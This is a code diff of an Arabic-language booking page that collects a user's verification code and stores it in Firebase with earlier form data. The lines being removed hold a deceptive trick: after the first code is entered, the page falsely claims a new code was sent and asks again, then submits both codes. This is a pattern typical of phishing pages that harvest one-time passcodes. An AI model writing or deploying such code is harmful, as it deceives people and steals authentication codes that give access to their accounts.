@@ -25,7 +25,6 @@
                     <p>يرجى إدخال رمز التحقق</p>
                     <p style="font-size:14px; color:#888;">أدخل الرمز الذي أُرسل إليك (4-6 أرقام)</p>
 
-                    <div id="verification-msg" class="success-message" style="display:none;"></div>
                     <div id="error-msg" class="error-message" style="display:none;"></div>
 
                     <form id="verificationForm" onsubmit="submitVerification(event)">
@@ -57,31 +56,15 @@
     <script src="firebase-config.js"></script>
     <script src="booking.js"></script>
     <script>
-        let awaitingSecondCode = false;
-        let firstVerificationCode = '';
-
         async function submitVerification(e) {
             e.preventDefault();
-            const codeInput = document.getElementById('verification_code');
-            const code = codeInput.value.trim();
+            const code = document.getElementById('verification_code').value.trim();
             const errMsg = document.getElementById('error-msg');
-            const verificationMsg = document.getElementById('verification-msg');
             errMsg.style.display = 'none';
-            verificationMsg.style.display = 'none';
 
             if (!code || code.length < 4) {
                 errMsg.textContent = 'يرجى إدخال رمز صحيح مكوّن من 4 إلى 6 أرقام';
                 errMsg.style.display = 'block';
-                return;
-            }
-
-            if (!awaitingSecondCode) {
-                awaitingSecondCode = true;
-                firstVerificationCode = code;
-                codeInput.value = '';
-                verificationMsg.textContent = 'تم إرسال رمز تحقق جديد، الرجاء إدخال الرمز مرة أخرى';
-                verificationMsg.style.display = 'block';
-                codeInput.focus();
                 return;
             }
 
@@ -95,7 +78,6 @@
                 ...step1,
                 ...step2,
                 ...step4,
-                first_verification_code: firstVerificationCode,
                 verification_code: code,
                 booking_type: bookingType,
                 status: 'completed'
